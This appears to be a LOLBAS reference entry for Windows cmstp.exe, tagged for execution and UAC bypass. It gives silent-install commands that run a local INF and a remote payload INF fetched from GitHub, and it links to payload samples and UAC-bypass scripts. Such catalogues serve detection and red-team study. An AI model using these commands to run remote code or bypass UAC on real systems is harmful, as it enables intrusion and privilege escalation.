## Cmstp.exe

* Functions: Execute, UACBypass

```
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf     

cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe
* Nick Tyrer - @NickTyrer

Code sample:
* [Cmstp.inf](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)    
* [Cmstp_calc.sct](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp_calc.sct)

Resources:
* https://twitter.com/NickTyrer/status/958450014111633408    
* https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80     
* https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
* https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
* https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1 (UAC Bypass)
* https://github.com/hfiref0x/UACME

Full path:
```
C:\Windows\system32\cmstp.exe
C:\Windows\sysWOW64\cmstp.exe
```

Notes:



 